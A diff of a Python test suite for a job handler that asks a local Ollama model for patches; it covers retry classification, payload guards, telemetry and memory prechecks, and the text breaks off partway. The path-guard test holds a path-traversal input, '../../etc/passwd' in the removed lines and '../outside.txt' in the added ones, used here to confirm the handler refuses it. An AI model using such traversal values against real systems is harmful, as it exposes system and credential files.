@@ -1,1072 +1,928 @@
-"""Tests for worker.qwen.handle_qwen_patch — happy path, retry_map, guards.
+"""Tests for worker.qwen.handle_qwen_patch: happy path, retry_map, guards.
+
+Every class here inherits QwenHandlerCase (tests/worker_tests/qwen_fixtures.py),
+which routes urllib.request.urlopen through a fixture and stubs the OTLP
+post. Transport failures are raised from urlopen itself, so they take the
+real _ollama_request -> _call_ollama_generate path rather than an exception
+shape injected at a seam the transport never raises.
 
 Route (a) is in effect (contract.json heartbeat.route_chosen == "a"): no
-heartbeat field exists, so this file carries a backward-compatibility test
-for the existing (pre-this-workflow) reaper-relevant job shape instead of any
-heartbeat freshness/staleness test. liveness_route_tested = "a".
-
-The implementation (src/worker/qwen.py) does not exist in this worktree —
-this stage runs in parallel with impl-handler. Import errors on worker.qwen
-are expected; see tests-impl.json.
-
-No network and no real model: every test patches worker.qwen._ollama_request
-(or a narrower guard seam) at the point of use. Nothing here calls a real
-Ollama endpoint.
+heartbeat field exists, so QwenBackwardCompatibilityTests covers the
+pre-existing reaper behaviour instead of heartbeat freshness.
 """
 
 from __future__ import annotations
 
+import contextlib
 import json
+import logging
+import os
+import subprocess  # nosec B404 - builds throwaway git repos inside the test temp dir
+import time
 import unittest
+import urllib.error
 from pathlib import Path
 from unittest import mock
 
-from tests.fixtures import TempDirMixin
+from telemetry.otel.models import OTLPSpansRecord
 from worker import queue_ops as q
-
-
-def _job(payload: dict[str, object], **overrides: object) -> dict[str, object]:
-    """Build a full job record the way JobSafeProcessor hands it to a handler."""
-    base: dict[str, object] = {
-        "id": "qwen-test-job",
-        "type": "qwen_patch",
-        "attempts": 0,
-        "max_attempts": 3,
-        "payload": payload,
-    }
-    base.update(overrides)
-    return base
-
-
-_VALID_DIFF = (
-    "diff --git a/README.md b/README.md\n"
-    "index e69de29..4b825dc 100644\n"
-    "--- a/README.md\n"
-    "+++ b/README.md\n"
-    "@@ -1 +1,2 @@\n"
-    " existing line\n"
-    "+added line\n"
+from worker import qwen
+from tests.worker_tests.qwen_fixtures import (
+    GREET_PATH,
+    MODEL,
+    REAL_DIFF,
+    REAL_GIT_APPLY_CHECK,
+    REAL_LANE_DEPTH,
+    RESULT_SCHEMA_KEYS,
+    RUNNING_DIGEST,
+    QwenHandlerCase,
+    fenced,
+    http_error,
 )
 
-_OLLAMA_RESPONSE = {
-    "response": f"```diff\n{_VALID_DIFF}```",
-    "prompt_eval_count": 42,
-    "eval_count": 7,
-}
+_PLAIN = qwen.TRANSIENT_OUTCOME_PREFIX
+_FAKE_TOKEN = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"  # nosec B105 - fixture value asserted as masked, not a real credential
 
 
-class QwenHandlerHappyPathTests(TempDirMixin, unittest.TestCase):
-    """A mocked 200 response with a valid unified diff succeeds."""
+def _git(repo: Path, *args: str) -> str:
+    result = subprocess.run(  # nosec B603 B607 - fixed git argv inside a test temp dir
+        ["git", *args], cwd=str(repo), capture_output=True, text=True, check=True
+    )
+    return result.stdout
+
+
+def _many_files_diff(count: int) -> str:
+    return "".join(f"--- a/src/f{i}.py\n+++ b/src/f{i}.py\n@@ -0,0 +1 @@\n+line{i}\n" for i in range(count))
+
+
+def _single_file_diff(path: str) -> str:
+    return f"--- a/{path}\n+++ b/{path}\n@@ -1 +1 @@\n-old\n+new\n"
+
+
+class QwenHandlerHappyPathTests(QwenHandlerCase):
+    """A 200 response carrying the real Ollama output shape succeeds."""
 
     def test_valid_diff_returns_success_matching_result_schema(self) -> None:
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        readme = repo_root / "src" / "README.md"
-        readme.write_text("existing line\n", encoding="utf-8")
-
-        job = _job({"files": ["src/README.md"], "instruction": "add a line"})
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)) as mock_request,
-            mock.patch("worker.qwen._git_apply_check", return_value=True),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
-        ):
-            ok, result = qwen.handle_qwen_patch(job)
+        ok, result = self.run_handler()
 
         self.assertTrue(ok)
-        self.assertIsInstance(result, dict)
-        for key in (
-            "patch_path",
-            "patch_valid",
-            "files_touched",
-            "lines_changed",
-            "model",
-            "duration_ms",
-        ):
-            self.assertIn(key, result)
-        self.assertTrue(result["patch_valid"])
+        assert isinstance(result, dict)
+        self.assertEqual(set(result), RESULT_SCHEMA_KEYS)
+        self.assertIs(result["patch_valid"], True)
         self.assertEqual(result["files_touched"], 1)
-        self.assertGreater(result["lines_changed"], 0)
-        mock_request.assert_called_once()
+        self.assertEqual(result["lines_changed"], 2)
+        self.assertEqual(result["model"], MODEL)
+        self.assertEqual(result["model_digest"], RUNNING_DIGEST)
+        self.assertIsNone(result["digest_matches_recorded"])
+        self.assertEqual(result["prompt_tokens"], 84)
+        self.assertEqual(result["completion_tokens"], 57)
+        self.assertIsInstance(result["duration_ms"], int)
+        self.assertGreaterEqual(result["duration_ms"], 0)
+        self.assertIsNone(result["deferral_reasons"])
+        self.assertEqual(len(self.generate_requests()), 1)
+
+    def test_patch_artifact_holds_the_extracted_diff_under_patch_dir(self) -> None:
+        ok, result = self.run_handler()
+
+        self.assertTrue(ok)
+        assert isinstance(result, dict)
+        patch_path = Path(str(result["patch_path"]))
+        self.assertEqual(patch_path, self.patch_dir / "qwen-test-job.patch")
+        self.assertEqual(patch_path.read_text(encoding="utf-8"), REAL_DIFF + "\n")
+        self.assertEqual(self.patch_files(), [patch_path])
+
+    def test_request_body_matches_the_transport_contract(self) -> None:
+        self.run_handler({"system": "be terse"})
+
+        [(url, body, timeout)] = self.generate_requests()
+        self.assertEqual(url, "http://localhost:11434/api/generate")
+        assert body is not None
+        self.assertEqual(body["model"], MODEL)
+        self.assertIs(body["stream"], False)
+        self.assertEqual(body["system"], "be terse")
+        self.assertEqual(body["options"], {"temperature": 0.2, "num_predict": 4096, "num_ctx": 8192})
+        self.assertEqual(timeout, 600)
+        self.assertIn("return the greeting", body["prompt"])
+
+    def test_ollama_host_env_override_is_used(self) -> None:
+        os.environ["QWEN_OLLAMA_HOST"] = "http://ollama.test:1234"
+
+        ok, _ = self.run_handler()
+
+        self.assertTrue(ok)
+        self.assertEqual(self.generate_requests()[0][0], "http://ollama.test:1234/api/generate")
+
+    def test_timeout_payload_falls_back_to_600_unless_positive_number(self) -> None:
+        cases = ((0, 600), (-5, 600), ("30", 600), (None, 600), (42, 42), (7.5, 7.5))
+        for raw, expected in cases:
+            with self.subTest(timeout=raw):
+                self.requests.clear()
+                self.run_handler({"timeout": raw})
+                self.assertEqual(self.generate_requests()[0][2], expected)
+
+    def test_real_response_passes_the_real_git_apply_check(self) -> None:
+        """The survey's real output has no trailing newline after the last
+        context line; _git_apply_check must add one or git reports a corrupt
+        patch."""
+        with mock.patch("worker.qwen._git_apply_check", wraps=REAL_GIT_APPLY_CHECK) as check:
+            ok, result = self.run_handler()
+
+        self.assertTrue(ok, result)
+        check.assert_called_once()
+        self.assertTrue(REAL_GIT_APPLY_CHECK(REAL_DIFF, self.repo_root))
+        self.assertFalse(REAL_GIT_APPLY_CHECK(REAL_DIFF.replace("print", "echo"), self.repo_root))
 
 
-# ---------------------------------------------------------------------------
-# retry_map — one test per condition, asserting the EXACT outcome prefix.
-# ---------------------------------------------------------------------------
+class QwenRetryMapTests(QwenHandlerCase):
+    """Every row of contract.json's retry_map, by exact outcome string."""
 
-
-class QwenRetryMapTests(TempDirMixin, unittest.TestCase):
-    """Every row of contract.json's retry_map, by exact outcome prefix."""
-
-    def _run_with_request_side_effect(self, side_effect):
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "add a line"})
-
-        # A dict passed as side_effect is iterated by mock (its keys become
-        # successive return values), not returned whole — only an exception
-        # or a callable/iterable-of-results belongs in side_effect. A mapping
-        # response must go through return_value instead.
-        patch_kwargs = (
-            {"return_value": side_effect} if isinstance(side_effect, dict) else {"side_effect": side_effect}
-        )
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._ollama_request", **patch_kwargs),
-            mock.patch("worker.qwen._git_apply_check", return_value=True),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
-        ):
-            return qwen.handle_qwen_patch(job)
+    def _assert_plain(self, out: object, detail: str) -> None:
+        self.assertEqual(out, f"{_PLAIN}: {detail}")
 
     def test_connection_refused_is_plain_failure(self) -> None:
-        ok, out = self._run_with_request_side_effect(ConnectionRefusedError("refused"))
-        self.assertFalse(ok)
-        self.assertFalse(str(out).startswith(("terminal-", "deferred-")))
+        self.generate_error = urllib.error.URLError(ConnectionRefusedError(61, "Connection refused"))
 
-    def test_request_timeout_is_plain_failure(self) -> None:
-        import socket
+        ok, out = self.run_handler()
 
-        ok, out = self._run_with_request_side_effect(socket.timeout("timed out"))
         self.assertFalse(ok)
-        self.assertFalse(str(out).startswith(("terminal-", "deferred-")))
+        self._assert_plain(out, "[Errno 61] Connection refused")
+
+    def test_connect_timeout_is_plain_failure(self) -> None:
+        self.generate_error = urllib.error.URLError(TimeoutError("timed out"))
+
+        ok, out = self.run_handler()
+
+        self.assertFalse(ok)
+        self._assert_plain(out, "timed out")
+
+    def test_read_timeout_is_plain_failure(self) -> None:
+        """A timeout during resp.read() escapes urlopen unwrapped."""
+        self.generate_error = TimeoutError("timed out")
+
+        ok, out = self.run_handler()
+
+        self.assertFalse(ok)
+        self._assert_plain(out, "timed out")
 
     def test_http_5xx_is_plain_failure(self) -> None:
-        import urllib.error
+        self.generate_error = http_error(503)
 
-        exc = urllib.error.HTTPError("url", 503, "Service Unavailable", {}, None)
-        ok, out = self._run_with_request_side_effect(exc)
+        ok, out = self.run_handler()
+
         self.assertFalse(ok)
-        self.assertFalse(str(out).startswith(("terminal-", "deferred-")))
+        self._assert_plain(out, "http-error-503")
 
     def test_http_404_model_not_found_is_terminal(self) -> None:
-        import urllib.error
+        self.generate_error = http_error(404)
 
-        exc = urllib.error.HTTPError("url", 404, "Not Found", {}, None)
-        ok, out = self._run_with_request_side_effect(exc)
+        ok, out = self.run_handler()
+
         self.assertFalse(ok)
-        self.assertTrue(str(out).startswith("terminal-model-not-found"))
+        self.assertEqual(out, "terminal-model-not-found")
+
+    def test_seam_error_shapes_classify_by_status(self) -> None:
+        """The exact shapes _ollama_request emits, injected at the seam."""
+        cases = (
+            (qwen.QwenGuardError("http-error-404"), "terminal-model-not-found"),
+            (qwen.QwenGuardError("http-error-503"), f"{_PLAIN}: http-error-503"),
+            (ConnectionError("refused"), f"{_PLAIN}: refused"),
+        )
+        for exc, expected in cases:
+            with self.subTest(exc=repr(exc)), mock.patch("worker.qwen._ollama_request", side_effect=exc):
+                self.assertEqual(self.run_handler(), (False, expected))
+
+    def test_malformed_json_body_is_plain_failure(self) -> None:
+        for raw, detail in (
+            (b"<html>502 Bad Gateway</html>", "malformed response body"),
+            (b"\xff\xfe", "malformed response body"),
+            (b"[1, 2]", "response body is not a JSON object"),
+        ):
+            with self.subTest(raw=raw):
+                self.generate_raw = raw
+                ok, out = self.run_handler()
+                self.assertFalse(ok)
+                self._assert_plain(out, detail)
 
     def test_no_diff_extractable_is_terminal(self) -> None:
-        ok, out = self._run_with_request_side_effect(
-            {"response": "sorry, I cannot help with that", "prompt_eval_count": 1, "eval_count": 1}
-        )
-        self.assertFalse(ok)
-        self.assertTrue(str(out).startswith("terminal-no-diff-found"))
+        for response in (
+            {"response": "sorry, I cannot help with that"},
+            {"response": ""},
+            {"error": "model runner crashed"},
+        ):
+            with self.subTest(response=response):
+                self.generate_response = response
+                self.assertEqual(self.run_handler(), (False, "terminal-no-diff-found"))
+        self.assertEqual(self.patch_files(), [])
 
     def test_patch_fails_git_apply_check_is_terminal(self) -> None:
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "add a line"})
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)),
-            mock.patch("worker.qwen._git_apply_check", return_value=False),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
-        ):
-            ok, out = qwen.handle_qwen_patch(job)
+        with mock.patch("worker.qwen._git_apply_check", return_value=False):
+            ok, out = self.run_handler()
 
         self.assertFalse(ok)
-        self.assertTrue(str(out).startswith("terminal-patch-does-not-apply"))
+        self.assertEqual(out, "terminal-patch-does-not-apply")
+        self.assertEqual(self.patch_files(), [])
 
     def test_disallowed_files_path_is_terminal_path_not_allowed(self) -> None:
-        from worker import qwen
+        outside = Path(self.tmpdir) / "outside.txt"
+        outside.write_text("root:x:0:0::/root:/bin/bash\n", encoding="utf-8")
 
-        repo_root = Path(self.tmpdir)
-        job = _job({"files": ["../../etc/passwd"], "instruction": "do a thing"})
-
-        with mock.patch("worker.qwen._repo_root", return_value=repo_root):
-            ok, out = qwen.handle_qwen_patch(job)
+        with mock.patch("pathlib.Path.read_text", side_effect=AssertionError("file was read")):
+            ok, out = self.run_handler({"files": ["../outside.txt"]})
 
         self.assertFalse(ok)
-        self.assertTrue(str(out).startswith("terminal-path-not-allowed"))
+        self.assertEqual(out, "terminal-path-not-allowed: ../outside.txt")
+        self.assertEqual(self.generate_requests(), [])
+
+    def test_nonexistent_file_inside_allowlist_is_terminal_path_not_allowed(self) -> None:
+        ok, out = self.run_handler({"files": ["src/missing.py"]})
+
+        self.assertFalse(ok)
+        self.assertEqual(out, "terminal-path-not-allowed: src/missing.py")
 
     def test_patch_too_broad_is_terminal(self) -> None:
-        from worker import qwen
+        """Real check_patch_caps, fed through the handler."""
+        self.generate_response = fenced(_many_files_diff(qwen.THRESHOLDS.max_files + 1))
 
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "add a line"})
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)),
-            mock.patch("worker.qwen._git_apply_check", return_value=True),
-            mock.patch("worker.qwen.check_patch_caps", return_value="terminal-patch-too-broad: too many files"),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
-        ):
-            ok, out = qwen.handle_qwen_patch(job)
+        ok, out = self.run_handler()
 
         self.assertFalse(ok)
-        self.assertTrue(str(out).startswith("terminal-patch-too-broad"))
+        self.assertEqual(out, "terminal-patch-too-broad")
+        self.assertEqual(self.patch_files(), [])
 
     def test_prompt_too_large_is_terminal(self) -> None:
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "x" * 10}, )
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            # QwenThresholds has no max_tokens_default field (interface.md);
-            # the payload's own max_tokens (default 4096, contract.json)
-            # already dwarfs a num_ctx=1 budget, so num_ctx alone is enough
-            # to force the context-budget guard to trip before any model call.
-            mock.patch("worker.qwen.THRESHOLDS", qwen.QwenThresholds(num_ctx=1)),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._ollama_request") as mock_request,
-        ):
-            ok, out = qwen.handle_qwen_patch(job)
+        with mock.patch("worker.qwen.THRESHOLDS", qwen.QwenThresholds(num_ctx=1)):
+            ok, out = self.run_handler()
 
         self.assertFalse(ok)
-        self.assertTrue(str(out).startswith("terminal-prompt-too-large"))
-        mock_request.assert_not_called()
+        self.assertEqual(out, "terminal-prompt-too-large")
+        self.assertEqual(self.generate_requests(), [])
 
-    # The "deferral side-channel ceiling exceeded -> terminal-deferral-limit"
-    # and "lane over capacity -> terminal-lane-over-capacity" retry_map rows
-    # are covered with full teeth (exact ceiling, dominant reason, and the
-    # handler-side admission check respectively) in QwenDeferralBoundTests
-    # and QwenAdmissionCapTests below, not duplicated here as a no-op
-    # placeholder.
+    def test_max_tokens_at_or_above_num_ctx_is_prompt_too_large(self) -> None:
+        for max_tokens in (8192, 9000):
+            with self.subTest(max_tokens=max_tokens):
+                self.assertEqual(
+                    self.run_handler({"max_tokens": max_tokens}), (False, "terminal-prompt-too-large")
+                )
+        self.assertEqual(self.generate_requests(), [])
+
+    def test_invalid_payload_is_terminal(self) -> None:
+        cases = (
+            {"files": None},
+            {"files": []},
+            {"files": "src/example/greet.py"},
+            {"files": [1]},
+            {"instruction": None},
+            {"instruction": "   "},
+        )
+        for overrides in cases:
+            with self.subTest(overrides=overrides):
+                ok, out = self.run_handler(overrides)
+                self.assertFalse(ok)
+                self.assertTrue(str(out).startswith("terminal-invalid-payload: "), out)
+        self.assertEqual(self.generate_requests(), [])
 
 
-# ---------------------------------------------------------------------------
-# Backward compatibility: a job record with no heartbeat field is unaffected.
-# ---------------------------------------------------------------------------
-
-
-class QwenBackwardCompatibilityTests(TempDirMixin, unittest.TestCase):
-    """Route (a): no heartbeat field is written or read by this handler.
-
-    Jobs built exactly as run_cli/run_shell build them today (no heartbeat
-    key) must be handled identically before and after this workflow.
-    """
+class QwenBackwardCompatibilityTests(QwenHandlerCase):
+    """Route (a): no heartbeat field is written or read by this handler."""
 
     def test_job_with_no_heartbeat_field_processes_normally(self) -> None:
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-
-        # Constructed exactly as existing handlers build a job — no
-        # "heartbeat" key anywhere in the record.
-        job: dict[str, object] = {
-            "id": "qwen-test-job-2",
-            "type": "qwen_patch",
-            "attempts": 0,
-            "max_attempts": 3,
-            "payload": {"files": ["src/README.md"], "instruction": "add a line"},
-        }
+        job = self.job()
         self.assertNotIn("heartbeat", job)
 
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)),
-            mock.patch("worker.qwen._git_apply_check", return_value=True),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
-        ):
-            ok, _ = qwen.handle_qwen_patch(job)
+        ok, _ = qwen.handle_qwen_patch(job)
 
         self.assertTrue(ok)
         self.assertNotIn("heartbeat", job)
 
     def test_existing_reaper_behaviour_unchanged_for_qwen_job_shape(self) -> None:
-        """Route (a) requires this test in place of any heartbeat test.
+        """A qwen job enqueued with the default timeout_sec is never reaped
+        under the shipped plist's job_timeout of 0, however old it is."""
+        queue_root = Path(self.tmpdir) / "queue"
+        job = q.Job(id="qwen-reaper-job", type="qwen_patch", payload={"files": [GREET_PATH], "instruction": "x"})
+        self.assertEqual(job.timeout_sec, 0)
+        proc_path = q.start_processing(q.enqueue(job, root=queue_root), root=queue_root)
+        assert proc_path is not None
+        day_old = time.time() - 86_400
+        os.utime(proc_path, (day_old, day_old))
 
-        A job record built exactly as run_cli/run_shell build it today (no
-        heartbeat field, no per-job timeout_sec set by this handler) still
-        reaps — or does not reap — on the same condition it did before this
-        workflow touched anything. Exercised directly against
-        worker.job_runtime._reap_one_job / reaper machinery, not against
-        worker.qwen, since qwen never writes a heartbeat field to affect it.
-        """
-        from worker import job_runtime as jr
+        reaped = q.reap_stale_processing_jobs(0, root=queue_root)
 
-        job_data: dict[str, object] = {
-            "id": "qwen-reaper-job",
-            "type": "qwen_patch",
-            "attempts": 0,
-            "max_attempts": 3,
-            "payload": {"files": ["src/README.md"], "instruction": "x"},
-            "processing_started_at": "2020-01-01T00:00:00+00:00",
-        }
-        self.assertNotIn("heartbeat", job_data)
-
-        # effective_timeout <= 0 (no --job-timeout, no per-job timeout_sec)
-        # makes the reaper's job-timeout branch a permanent no-op, exactly as
-        # it was before this workflow — regardless of job type or age.
-        effective_timeout = jr._effective_job_timeout(job_data, default_timeout=0)
-        self.assertEqual(effective_timeout, 0)
+        self.assertEqual(reaped, [])
+        self.assertTrue(proc_path.exists())
 
 
-# ---------------------------------------------------------------------------
-# Telemetry non-fatal
-# ---------------------------------------------------------------------------
-
-
-class QwenTelemetryNonFatalTests(TempDirMixin, unittest.TestCase):
-    """A telemetry export failure must never take the job down with it."""
+class QwenTelemetryTests(QwenHandlerCase):
+    """One qwen.job span per completed model call, with contract attributes."""
 
     def test_job_succeeds_when_telemetry_export_raises(self) -> None:
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "add a line"})
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)),
-            mock.patch("worker.qwen._git_apply_check", return_value=True),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
-            mock.patch(
-                "worker.qwen.export_job_span",
-                side_effect=RuntimeError("collector unreachable"),
-            ),
-        ):
-            ok, result = qwen.handle_qwen_patch(job)
+        with mock.patch("worker.qwen.export_job_span", side_effect=RuntimeError("collector unreachable")):
+            ok, result = self.run_handler()
 
         self.assertTrue(ok)
-        self.assertIsInstance(result, dict)
-        self.assertIn("patch_path", result)
+        assert isinstance(result, dict)
+        self.assertTrue(Path(str(result["patch_path"])).exists())
+
+    def test_job_succeeds_when_collector_post_fails(self) -> None:
+        self.post.side_effect = OSError("connection refused")
+
+        ok, _ = self.run_handler()
+
+        self.assertTrue(ok)
+        self.post.assert_called_once()
+
+    def test_success_emits_one_span_with_contract_attributes(self) -> None:
+        ok, _ = self.run_handler()
+
+        self.assertTrue(ok)
+        [attrs] = self.span_attrs()
+        self.assertEqual(attrs["qwen.outcome"], "success")
+        self.assertEqual(attrs["qwen.job_id"], "qwen-test-job")
+        self.assertEqual(attrs["qwen.job_type"], "qwen_patch")
+        self.assertEqual(attrs["qwen.model"], MODEL)
+        self.assertEqual(attrs["qwen.attempt"], 0)
+        self.assertIs(attrs["qwen.patch_valid"], True)
+        self.assertEqual(attrs["qwen.prompt_tokens"], 84)
+        self.assertEqual(attrs["qwen.completion_tokens"], 57)
+        self.assertIsInstance(attrs["qwen.generation_duration_ms"], int)
+        self.assertEqual(attrs["qwen.model_pin"], "unpinned")
+        self.assertEqual(attrs["qwen.model_digest"], RUNNING_DIGEST)
+        self.assertFalse(any("cost" in key for key in attrs))
+
+    def test_posted_span_round_trips_to_the_default_collector(self) -> None:
+        self.run_handler()
+
+        [call] = self.post.call_args_list
+        url, doc = call.args[0], call.args[1]
+        self.assertEqual(url, "http://localhost:4318/v1/traces")
+        self.assertEqual(call.kwargs, {"timeout": 5})
+        span = OTLPSpansRecord.from_dict(doc).spans[0]
+        self.assertEqual(span.name, "qwen.job")
+        self.assertEqual(span.get_attr("qwen.outcome"), "success")
+
+    def test_otlp_endpoint_env_override(self) -> None:
+        os.environ["OTEL_EXPORTER_OTLP_ENDPOINT"] = "http://collector.test:9999"
+
+        self.run_handler()
+
+        self.assertEqual(self.post.call_args.args[0], "http://collector.test:9999/v1/traces")
+
+    def test_terminal_outcome_emits_span_with_exact_outcome(self) -> None:
+        with mock.patch("worker.qwen._git_apply_check", return_value=False):
+            self.run_handler()
+
+        [attrs] = self.span_attrs()
+        self.assertEqual(attrs["qwen.outcome"], "terminal-patch-does-not-apply")
+        self.assertIsNone(attrs["qwen.patch_valid"])
 
 
-# ---------------------------------------------------------------------------
-# Memory precheck
-# ---------------------------------------------------------------------------
-
-
-class QwenMemoryPrecheckTests(TempDirMixin, unittest.TestCase):
-    def _base_patches(self, repo_root: Path):
-        return [
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._git_apply_check", return_value=True),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
-        ]
-
+class QwenMemoryPrecheckTests(QwenHandlerCase):
     def test_low_memory_defers_and_does_not_call_model(self) -> None:
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "add a line"})
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._git_apply_check", return_value=True),
-            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
-            mock.patch("worker.qwen._lane_depth", return_value=0),
-            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
-            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
-            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
-            mock.patch("worker.qwen._model_digest", return_value=None),
-            mock.patch("worker.qwen._available_memory_bytes", return_value=1024**2),  # ~1MB, well below threshold
-            mock.patch("worker.qwen._ollama_request") as mock_request,
-        ):
-            ok, out = qwen.handle_qwen_patch(job)
+        with mock.patch("worker.qwen._available_memory_bytes", return_value=1024**2):
+            ok, out = self.run_handler()
 
         self.assertFalse(ok)
-        self.assertTrue(str(out).startswith("deferred-low-memory"))
-        mock_request.assert_not_called()
+        self.assertEqual(out, "deferred-low-memory")
+        self.assertEqual(self.generate_requests(), [])
+        self.assertTrue(self.deferral_file().exists())
 
     def test_ample_memory_proceeds_to_call_model(self) -> None:
-        from worker import qwen
-
-        repo_root = Path(self.tmpdir)
-        (repo_root / "src").mkdir()
-        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
-        job = _job({"files": ["src/README.md"], "instruction": "add a line"})
-
-        with (
-            mock.patch("worker.qwen._repo_root", return_value=repo_root),
-            mock.patch("worker.qwen._git_apply_check", return_value=True),
